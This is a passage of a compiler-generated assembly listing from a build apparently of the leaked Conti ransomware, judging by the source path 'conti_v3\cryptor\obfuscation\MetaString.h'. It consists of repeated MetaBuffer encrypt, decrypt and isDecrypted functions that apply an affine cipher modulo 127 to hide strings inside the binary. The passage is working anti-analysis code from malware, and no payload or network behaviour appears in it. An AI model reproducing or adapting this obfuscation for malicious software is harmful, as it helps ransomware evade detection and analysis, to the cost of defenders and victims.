  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 69	 add	 r8d, 105		; 00000069H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0c	 sub	 eax, 12
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0c	 add	 r8d, 12
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 1f	 sub	 eax, 31
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1f	 add	 r8d, 31
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 78	 sub	 eax, 120		; 00000078H
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 78	 add	 r8d, 120		; 00000078H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 6f 00 00 00	 mov	 ecx, 111		; 0000006fH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 6f
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+111]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 58 00 00 00	 mov	 ecx, 88			; 00000058H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 58	 add	 r8d, 88			; 00000058H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
